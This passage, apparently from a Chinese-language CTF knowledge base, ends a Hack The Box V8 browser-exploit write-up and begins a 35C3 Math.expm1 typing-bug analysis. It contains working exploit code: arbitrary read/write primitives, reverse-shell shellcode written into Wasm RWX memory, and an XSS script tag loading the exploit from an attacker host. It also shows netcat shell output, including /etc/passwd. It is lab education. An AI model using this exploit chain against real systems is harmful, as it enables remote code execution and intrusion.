class="number">0</span>xffffffffn;</span><br><span class="line">var rwx = arb_read(wasm_instance_addr + <span class="number">0</span>x68n &amp; <span class="number">0</span>xffffffffn);</span><br><span class="line"></span><br><span class="line">console.log(&quot;[+] Wasm instance address: <span class="number">0</span>x&quot; + wasm_instance_addr.toString(<span class="number">16</span>));</span><br><span class="line"></span><br><span class="line">console.log(<span class="string">&quot;[*] RWX INSTANCE:   0x&quot;</span> + rwx.toString(16));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">var arr_buf = new ArrayBuffer(0x100);</span><br><span class="line">var dataview = new DataView(arr_buf);</span><br><span class="line"></span><br><span class="line">var arr_buf_addr = addrof(arr_buf) &amp; 0xffffffffn;;</span><br><span class="line">var back_store_addr = arb_read(arr_buf_addr + 0x14n);</span><br><span class="line"></span><br><span class="line">console.log(<span class="string">&quot;[+] ArrayBuffer address: 0x&quot;</span> + arr_buf_addr.toString(16));</span><br><span class="line">console.log(<span class="string">&quot;[+] Back store pointer: 0x&quot;</span> + back_store_addr.toString(16));</span><br><span class="line"></span><br><span class="line">arb_write(arr_buf_addr + 0x14n, rwx);</span><br><span class="line"></span><br><span class="line">var shellcode = [</span><br><span class="line">    0x6a, 0x29, 0x58, 0x99, 0x6a, 0x02, 0x5f, 0x6a, 0x01, 0x5e, 0x0f, 0x05, 0x48, 0x97, 0x48, </span><br><span class="line">    0xb9, 0x02, 0x00, 0x10, 0x7e, 0x0a, 0x0a, 0x0e, 0x0c, 0x51, 0x48, 0x89, 0xe6, 0x6a, 0x10, </span><br><span class="line">    0x5a, 0x6a, 0x2a, 0x58, 0x0f, 0x05, 0x6a, 0x03, 0x5e, 0x48, 0xff, 0xce, 0x6a, 0x21, 0x58, </span><br><span class="line">    0x0f, 0x05, 0x75, 0xf6, 0x6a, 0x3b, 0x58, 0x99, 0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, </span><br><span class="line">    0x73, 0x68, 0x00, 0x53, 0x48, 0x89, 0xe7, 0x52, 0x57, 0x48, 0x89, 0xe6, 0x0f, 0x05</span><br><span class="line">];  // shellcode <span class="keyword">for</span> spawning a reverse shell</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="built_in">let</span> i = 0; i &lt; shellcode.length; i++) &#123;</span><br><span class="line">  dataview.setUint8(i, shellcode[i], <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">console.log(<span class="string">&quot;[+] Spawning a shell...&quot;</span>);</span><br><span class="line">pwn();</span><br></pre></td></tr></table></figure>
+
+<p>现在，问题是，应该把这个漏洞利用在哪里，在任何端口上都没有运行chrome实例，但随后,端口8000,在这一点上,评论模板可能XSS漏洞,这是唯一的方法,似乎可行,所以exploit</p>
+<figure class="highlight bash" data-code="PHNjcmlwdCBzcmM9Imh0dHA6Ly8xMC4xMC4xNC4xMi94cGwuanMiPjwvc2NyaXB0Pgo="><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;http://10.10.14.12/xpl.js&quot;</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>插入到消息框中,netcat监听器等待连接,得到了chromeuser的shell</p>
+<figure class="highlight bash" data-code="cm9vdEBsdWNpOn4vdjhidWlsZC9yb3BlMiMgcHl0aG9uIC1tIFNpbXBsZUhUVFBTZXJ2ZXIgODAKU2VydmluZyBIVFRQIG9uIDAuMC4wLjAgcG9ydCA4MCAuLi4KMTAuMTAuMTAuMTk2IC0gLSBbMjQvSmFuLzIwMjEgMDA6NTA6MDhdICJHRVQgL3hwbC5qcyBIVFRQLzEuMSIgMjAwIC0KMTAuMTAuMTAuMTk2IC0gLSBbMjQvSmFuLzIwMjEgMDA6NTA6MzFdICJHRVQgL3hwbC5qcyBIVFRQLzEuMSIgMjAwIAo="><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@luci:~/v8build/rope2<span class="comment"># python -m SimpleHTTPServer 80</span></span><br><span class="line">Serving HTTP on 0.0.0.0 port 80 ...</span><br><span class="line">10.10.10.196 - - [24/Jan/2021 00:50:08] <span class="string">&quot;GET /xpl.js HTTP/1.1&quot;</span> 200 -</span><br><span class="line">10.10.10.196 - - [24/Jan/2021 00:50:31] <span class="string">&quot;GET /xpl.js HTTP/1.1&quot;</span> 200 </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash" data-code="cm9vdEBsdWNpOi9ob21lL3VzZXIjIG5jIC1sdnAgNDIyMgpMaXN0ZW5pbmcgb24gWzAuMC4wLjBdIChmYW1pbHkgMCwgcG9ydCA0MjIyKQpDb25uZWN0aW9uIGZyb20gWzEwLjEwLjEwLjE5Nl0gcG9ydCA0MjIyIFt0Y3AvKl0gYWNjZXB0ZWQgKGZhbWlseSAyLCBzcG9ydCA1OTM0MikKaWQKdWlkPTEwMDEoY2hyb21ldXNlcikgZ2lkPTEwMDEoY2hyb21ldXNlcikgZ3JvdXBzPTEwMDEoY2hyb21ldXNlcikKd2hvYW1pCmNocm9tZXVzZXIKcHdkCi9ob21lL2Nocm9tZXVzZXIvd2ViCmxzCmNocm9tZS50YXIuZ3oKbWFpbi5weQpvdXRwdXQKdGVtcGxhdGVzCnVuYW1lIC1hCkxpbnV4IHJvcGUyIDUuMC4wLTM4LWdlbmVyaWMgIzQxLVVidW50dSBTTVAgVHVlIERlYyAzIDAwOjI3OjM1IFVUQyAyMDE5IHg4Nl82NCB4ODZfNjQgeDg2XzY0IEdOVS9MaW51eApjYXQgL2V0Yy9wYXNzd2QKcm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovdmFyL3J1bi9pcmNkOi91c3Ivc2Jpbi9ub2xvZ2luCmduYXRzOng6NDE6NDE6R25hdHMgQnVnLVJlcG9ydGluZyBTeXN0ZW0gKGFkbWluKTovdmFyL2xpYi9nbmF0czovdXNyL3NiaW4vbm9sb2dpbgpub2JvZHk6eDo2NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtdGltZXN5bmM6eDoxMDA6MTAyOnN5c3RlbWQgVGltZSBTeW5jaHJvbml6YXRpb24sLCw6L3J1bi9zeXN0ZW1kOi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtbmV0d29yazp4OjEwMToxMDM6c3lzdGVtZCBOZXR3b3JrIE1hbmFnZW1lbnQsLCw6L3J1bi9zeXN0ZW1kOi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtcmVzb2x2ZTp4OjEwMjoxMDQ6c3lzdGVtZCBSZXNvbHZlciwsLDovcnVuL3N5c3RlbWQ6L3Vzci9zYmluL25vbG9naW4KbWVzc2FnZWJ1czp4OjEwMzoxMDY6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgpzeXNsb2c6eDoxMDQ6MTA5OjovaG9tZS9zeXNsb2c6L3Vzci9zYmluL25vbG9naW4KX2FwdDp4OjEwNTo2NTUzNDo6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnV1aWRkOng6MTA2OjExMDo6L3J1bi91dWlkZDovdXNyL3NiaW4vbm9sb2dpbgpsYW5kc2NhcGU6eDoxMDc6MTE0OjovdmFyL2xpYi9sYW5kc2NhcGU6L3Vzci9zYmluL25vbG9naW4KcG9sbGluYXRlOng6MTA4OjE6Oi92YXIvY2FjaGUvcG9sbGluYXRlOi9iaW4vZmFsc2UKc3NoZDp4OjEwOTo2NTUzNDo6L3J1bi9zc2hkOi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtY29yZWR1bXA6eDo5OTk6OTk5OnN5c3RlbWQgQ29yZSBEdW1wZXI6Lzovc2Jpbi9ub2xvZ2luCnI0ajp4OjEwMDA6MTAwMDpyNGo6L2hvbWUvcjRqOi9iaW4vYmFzaApseGQ6eDo5OTg6MTAwOjovdmFyL3NuYXAvbHhkL2NvbW1vbi9seGQ6L2Jpbi9mYWxzZQpjaHJvbWV1c2VyOng6MTAwMToxMDAxOiwsLDovaG9tZS9jaHJvbWV1c2VyOi9iaW4vYmFzaApmdHA6eDoxMTA6MTE2OmZ0cCBkYWVtb24sLCw6L3Nydi9mdHA6L3Vzci9zYmluL25vbG9naW4KZ2l0bGFiLXd3dzp4Ojk5Nzo5OTc6Oi92YXIvb3B0L2dpdGxhYi9uZ2lueDovYmluL2ZhbHNlCmdpdDp4Ojk5Njo5OTY6Oi92YXIvb3B0L2dpdGxhYjovYmluL3NoCmdpdGxhYi1yZWRpczp4Ojk5NTo5OTU6Oi92YXIvb3B0L2dpdGxhYi9yZWRpczovYmluL2ZhbHNlCmdpdGxhYi1wc3FsOng6OTk0Ojk5NDo6L3Zhci9vcHQvZ2l0bGFiL3Bvc3RncmVzcWw6L2Jpbi9zaApnaXRsYWItcHJvbWV0aGV1czp4Ojk5Mzo5OTM6Oi92YXIvb3B0L2dpdGxhYi9wcm9tZXRoZXVzOi9iaW4vc2gK"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">root@luci:/home/user<span class="comment"># nc -lvp 4222</span></span><br><span class="line">Listening on [0.0.0.0] (family 0, port 4222)</span><br><span class="line">Connection from [10.10.10.196] port 4222 [tcp/*] accepted (family 2, sport 59342)</span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=1001(chromeuser) gid=1001(chromeuser) <span class="built_in">groups</span>=1001(chromeuser)</span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">chromeuser</span><br><span class="line"><span class="built_in">pwd</span></span><br><span class="line">/home/chromeuser/web</span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">chrome.tar.gz</span><br><span class="line">main.py</span><br><span class="line">output</span><br><span class="line">templates</span><br><span class="line"><span class="built_in">uname</span> -a</span><br><span class="line">Linux rope2 5.0.0-38-generic <span class="comment">#41-Ubuntu SMP Tue Dec 3 00:27:35 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux</span></span><br><span class="line"><span class="built_in">cat</span> /etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line"><span class="built_in">sync</span>:x:4:65534:<span class="built_in">sync</span>:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">systemd-network:x:101:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">messagebus:x:103:106::/nonexistent:/usr/sbin/nologin</span><br><span class="line">syslog:x:104:109::/home/syslog:/usr/sbin/nologin</span><br><span class="line">_apt:x:105:65534::/nonexistent:/usr/sbin/nologin</span><br><span class="line">uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin</span><br><span class="line">landscape:x:107:114::/var/lib/landscape:/usr/sbin/nologin</span><br><span class="line">pollinate:x:108:1::/var/cache/pollinate:/bin/false</span><br><span class="line">sshd:x:109:65534::/run/sshd:/usr/sbin/nologin</span><br><span class="line">systemd-coredump:x:999:999:systemd Core Dumper:/:/sbin/nologin</span><br><span class="line">r4j:x:1000:1000:r4j:/home/r4j:/bin/bash</span><br><span class="line">lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false</span><br><span class="line">chromeuser:x:1001:1001:,,,:/home/chromeuser:/bin/bash</span><br><span class="line">ftp:x:110:116:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin</span><br><span class="line">gitlab-www:x:997:997::/var/opt/gitlab/nginx:/bin/false</span><br><span class="line">git:x:996:996::/var/opt/gitlab:/bin/sh</span><br><span class="line">gitlab-redis:x:995:995::/var/opt/gitlab/redis:/bin/false</span><br><span class="line">gitlab-psql:x:994:994::/var/opt/gitlab/postgresql:/bin/sh</span><br><span class="line">gitlab-prometheus:x:993:993::/var/opt/gitlab/prometheus:/bin/sh</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><img loading="lazy" decoding="async" src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb170.jpg"></li>
+</ul>
+<p>we finally success! amazing!</p>
+<!-- kb:end chrome-browserv8-pwn -->
+
+</details>
+
+<p><a id="case-exploiting-the-math-expm1-typing-bug-in-v8"></a></p>
+<h2 id="负零类型推断与越界原语"><a href="#负零类型推断与越界原语" class="headerlink" title="负零类型推断与越界原语"></a>负零类型推断与越界原语</h2><p>35C3 题目围绕 Math.expm1 的类型信息与优化阶段展开，保留从错误边界推断到数组长度破坏、ArrayBuffer 任意读写的推导。</p>
+<p class="kb-provenance">来源 Exploiting-the-Math-expm1-typing-bug-in-V8 · 原记录 2021-02-15 · 31 个代码块 · 7 处图片引用</p>
+
+<details class="kb-evidence" id="record-exploiting-the-math-expm1-typing-bug-in-v8">
+<summary>查看分析过程、攻击步骤与完整代码</summary>
+
+<!-- kb:start Exploiting-the-Math-expm1-typing-bug-in-V8 -->
+
+<figure class="highlight bash" data-code="TWludXMgemVybyBiZWhhdmVzIGxpa2UgemVybywgcmlnaHQ/Cg=="><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Minus zero behaves like zero, right?</span><br></pre></td></tr></table></figure>
+
+<p>喜欢浏览器漏洞利用。是破坏了我认为是每天运行的最复杂的软件之一. 在<span class="exturl" data-url="aHR0cHM6Ly9jdGZ0aW1lLm9yZy9ldmVudC83MTg=">35C3 CTF<i class="fa fa-external-link-alt"></i></span> 今年(和KJC + mhackeroni一起比赛，获得了第一名!) 这有一个Chrome挑战关于利用一个v8<span class="exturl" data-url="aHR0cHM6Ly9idWdzLmNocm9taXVtLm9yZy9wL3Byb2plY3QtemVyby9pc3N1ZXMvZGV0YWlsP2lkPTE3MTA=">漏洞<i class="fa fa-external-link-alt"></i></span>, Chrome的 JavaScript引擎. 这个错误在静态分析期间导致了不正确的输入, 在即时编译的代码中产生不正确的优化. 这真的很难触发: 没能在CTF中及时完成, 但我觉得很多人会对一篇完整的WRITEUP感兴趣. <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9fdHN1cm8=">@_tsuro<i class="fa fa-external-link-alt"></i></span>感谢你一开始就找到了漏洞，也感谢你所面临的巨大挑战, 还有ESPR的精彩CTF!</p>
+<figure class="highlight bash" data-code="S3JhdXRmbGFyZeeahOWRmOW3peaYr+aXoOacjeWKoeWZqOiuoeeul+mihuWfn+eahOacgOaWsOeqgeegtOOAgueUseS6jumdnuW4uOmHjeinhuWuieWFqOaAp++8jOeUmuiHs+WwhuWuouaIt+eahOW3peS9nOi0n+i9veebuOS6kumalOemuyEKCuWcqOa8lOekuuS4rSwg5re75Yqg5LqG5LiA5Liq5Y+k6ICB55qEdjjmvI/mtJ7vvIzku6XooajmmI7lroPmmK/kuI3lj6/liKnnlKjnmoQhIOenu+atpWh0dHBzOi8vYnVncy5jaHJvbWl1bS5vcmcvcC9wcm9qZWN0LXplcm8vaXNzdWVzL2RldGFpbD9pZD0xNzEwIOafpeeci+e7huiKgi4g5bm46L+Q55qE5piv77yM6L+Z5pivdjjnmoTmnIDlkI7kuIDkuKrmvI/mtJ7vvIzku47njrDlnKjotbfkuqflk4HlsIbmmK/lronlhajnmoQuCgrmlofku7blnKg6IGh0dHBzOi8vMzVjM2N0Zi5jY2MuYWMvdXBsb2Fkcy9rcmF1dGZsYXJlLTMzY2UxMDIxZjIzNTM2MDdhOWQ0Y2MwYWYwMmIwYjI4LnRhcgoK5oyR5oiY5ZyoOiBuYyAzNS4yNDYuMTcyLjE0MiAxCgrms6jph4o6IOi/meS4quaMkeaImOW+iOmaviEg5a6D5piv5Li65pyJ55qE5Lq65ZyocHduYWJsZeS4iuimgeaxgueahCwg5Zyo6L+Z5Liq5o6o5paH5LitOiBodHRwczovL3R3aXR0ZXIuY29tL190c3Vyby9zdGF0dXMvMTA1NzY3NjA1OTU4NjU2MDAwMC4g5bC9566h5LiK6Z2i6ZO+5o6l55qE6ZSZ6K+v57uZ5LqG5LiA5Liq5aaC5L2V5Yip55So5a6D55qE57KX55Wl55qE5ryU57uD77yM5Y+q6ZyA6KaB5om+5Ye657uG6IqC44CC5biM5pyb5L2g5Zyo57yW6K+R5Zmo6K6y5bqn5LiK5rOo5oSP5LqGOinjgILnpZ3lpb3ov5DvvIzlt7Lnu4/orablkYrov4fkvaDkuoYhCg=="><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Krautflare的员工是无服务器计算领域的最新突破。由于非常重视安全性，甚至将客户的工作负载相互隔离!</span><br><span class="line"></span><br><span class="line">在演示中, 添加了一个古老的v8漏洞，以表明它是不可利用的! 移步https://bugs.chromium.org/p/project-zero/issues/detail?<span class="built_in">id</span>=1710 查看细节. 幸运的是，这是v8的最后一个漏洞，从现在起产品将是安全的.</span><br><span class="line"></span><br><span class="line">文件在: https://35c3ctf.ccc.ac/uploads/krautflare-33ce1021f2353607a9d4cc0af02b0b28.tar</span><br><span class="line"></span><br><span class="line">挑战在: nc 35.246.172.142 1</span><br><span class="line"></span><br><span class="line">注释: 这个挑战很难! 它是为有的人在pwnable上要求的, 在这个推文中: https://twitter.com/_tsuro/status/1057676059586560000. 尽管上面链接的错误给了一个如何利用它的粗略的演练，只需要找出细节。希望你在编译器讲座上注意了:)。祝好运，已经警告过你了!</span><br></pre></td></tr></table></figure>
+
+<h4 id="The-bug"><a href="#The-bug" class="headerlink" title="The bug"></a>The bug</h4><p>浏览一下bug报告，它给出了一个粗略的演练，并尝试解析它。</p>
+<figure class="highlight bash" data-code="6K+l57G75Z6L6K6+572uTWF0aC5leHBtMeS4ulVuaW9uKFBsYWluTnVtYmVyLCBOYU4p44CC6L+Z57y65bCR5LqGLTAg55qE5oOF5Ya1OiBNYXRoLmV4cG0xKC0wKSDov5Tlm54gLTDjgIIK"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">该类型设置Math.expm1为Union(PlainNumber, NaN)。这缺少了-0 的情况: Math.expm1(-0) 返回 -0。</span><br></pre></td></tr></table></figure>
+
+<p>现代的JS引擎，如V8，对JS代码执行即时(JIT)编译，也就是说，它们将JavaScript转换为本机代码，以便更快地执行。在点火解释器执行一个函数多次后，该代码被标记为热路径，并由Turbofan JIT编译器编译。显然，我们希望尽可能地优化代码。因此，V8的优化管道大量使用了静态分析。感兴趣的最重要的属性之一是类型: 由于JavaScript是一种非常动态的语言，知道在运行时可以看到什么类型对于优化是至关重要的。</p>
+<p>分析管道的一个组件是类型。它的作用是处理代码的中间表示中的节点，并根据可能的输入类型计算可能的输出类型。例如，一个常见的类型是range: 如果一个节点输出range(1,3)，这意味着它可以有1、2或3的值。</p>
+<p>在本例中，输入器表示Math.expm1的类型函数总是Union(PlainNumber, NaN) (see buggy <span class="exturl" data-url="aHR0cHM6Ly9jcy5jaHJvbWl1bS5vcmcvY2hyb21pdW0vc3JjL3Y4L3NyYy9jb21waWxlci90eXBlci5jYz9yY2w9OTY4MDMzOGM2MjJkNDY5M2Y5ODRiNDlmYjI0ZDEwMWFjZDJkODExMiZsPTE0Mzc=">typer.cc<i class="fa fa-external-link-alt"></i></span>和<span class="exturl" data-url="aHR0cHM6Ly9jcy5jaHJvbWl1bS5vcmcvY2hyb21pdW0vc3JjL3Y4L3NyYy9jb21waWxlci9vcGVyYXRpb24tdHlwZXIuY2M/cmNsPTk2ODAzMzhjNjIyZDQ2OTNmOTg0YjQ5ZmIyNGQxMDFhY2QyZDgxMTImbD00MjA=">operation-typer.cc<i class="fa fa-external-link-alt"></i></span>). 这意味着输出要么是一个纯数字，要么是一个浮点NaN。plain - number类型表示除-0之外的任何浮点数。是的，浮点数有一个 - 0。然而，在运行时，Math.expm(-0)恰好是-0。因此，typer对类型做出了错误的假设。这种类型将传播到其他操作: 也许可以从中得到一个与安全相关的错误优化。</p>
+<figure class="highlight bash" data-code="5Y+R546w5Y+v5Lul5Yy65YiGMOWSjC0w55qE5pyJ6Laj5qGI5L6L5piv6Zmk5rOV77yMYXRhbjLlkoxPYmplY3QuaXPjgILlnKjliY3kuKTnp43mg4XlhrXkuK3vvIzovpPlhaXku6PnoIHkuI3lpITnkIbotJ8w77yM5Zug5q2k5Y+q5Ymp5LiLT2JqZWN0Lmlz44CCCg=="><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">发现可以区分0和-0的有趣案例是除法，atan2和Object.is。在前两种情况中，输入代码不处理负0，因此只剩下Object.is。</span><br></pre></td></tr></table></figure>
+
+<p>下一个自然的问题是: -0在哪里会产生影响? 基本上，唯一有趣的情况是Object.is(Math.expm1(-0)， -0)。如果检查一下数学的结果。expm1是-0，输入者认为答案总是假的，但它在运行时可能为真或假。</p>
+<figure class="highlight bash" data-code="5LqL5a6e5LiK77yM6L+Z5LiqdHlwZXLov5DooYzkuoYz5qyhOgoKMS4g5ZyodHlwZXLpmLbmrrUKMi4g5ZyoVHlwZU5hcnJvd2luZ1JlZHVjZXIo6LSf6L295raI6Zmk6Zi25q61KQozLiDlnKjnroDljJbnmoTpmY3kvY7pmLbmrrUKCuWcqOWJjeS4pOasoei+k+WFpei/kOihjOS5i+WQju+8jENvbnN0YW50Rm9sZGluZ1JlZHVjZXLlsIbov5DooYzvvIzmiYDku6XlpoLmnpzorqnovpPlhaXogIXmoIforrDlr7nosaHjgIJpcyByZXN1bHTlp4vnu4jkuLpmYWxzZeatpOaXtu+8jOWug+Wwhuiiq+abv+aNouS4uuS4gOS4quWBh+W4uOaVsOOAgui/meWwseWJqeS4i+esrOS4iei9rnR5cGluZ+S6huOAggo="><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">事实上，这个typer运行了3次:</span><br><span class="line"></span><br><span class="line">1. 在typer阶段</span><br><span class="line">2. 在TypeNarrowingReducer(负载消除阶段)</span><br><span class="line">3. 在简化的降低阶段</span><br><span class="line"></span><br><span class="line">在前两次输入运行之后，ConstantFoldingReducer将运行，所以如果让输入者标记对象。is result始终为<span class="literal">false</span>此时，它将被替换为一个假常数。这就剩下第三轮typing了。</span><br></pre></td></tr></table></figure>
+
+<p>好吧，这里有一堆V8内部组件: 稍后再看。主要的一点是，该类型在管道中有多次运行，其间穿插着各种优化过程。如果typer过早发现在比较数学。expm1到-0，它只是将比较折叠成一个假常数(这并不完全发生在ConstantFoldingReducer中，稍后会更好地看到它)。这对我们来说是没有用的: 从功能的角度来看，代码是不正确的，但没有安全问题。另一方面，不想让输入器太晚发现-0比较，否则就不会得到正在寻找的错误优化。在我看来，这是整个行动的关键所在。</p>
+<figure class="highlight bash" data-code="5a+56LGh44CC5q2k5pe277yMaXPosIPnlKjlj6/ku6XnlKjkuKTnp43lvaLlvI/ooajnpLrjgILkvZzkuLpPYmplY3RJc01pbnVzWmVyb+iKgueCue+8jOWmguaenOWFiOWJjeeahHBhc3Pnn6XpgZPmr5TovoMtMOaIluS9nOS4ulNhbWVWYWx1ZeiKgueCueOAgk9iamVjdElzTWludXNaZXJv55qE5oOF5Ya15Ly85LmO5bm25LiN5pyJ6Laj77yM5Zug5Li657G75Z6L5L+h5oGv5rKh5pyJ5ZyoVXBkYXRlRmVlZGJhY2tUeXBl5Ye95pWw5Lit5Lyg5pKt44CC55u45ZCM5YC855qE5Y+N6aaI57G75Z6L5Lya6KKr5Lyg5pKt77yM5bm25LiU5Lya6KKr55So5LqO6IyD5Zu06K6h566XKOeOsOWcqOaciWJ1ZynjgIIK"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">对象。此时，is调用可以用两种形式表示。作为ObjectIsMinusZero节点，如果先前的pass知道比较-0或作为SameValue节点。ObjectIsMinusZero的情况似乎并不有趣，因为类型信息没有在UpdateFeedbackType函数中传播。相同值的反馈类型会被传播，并且会被用于范围计算(现在有bug)。</span><br></pre></td></tr></table></figure>
+
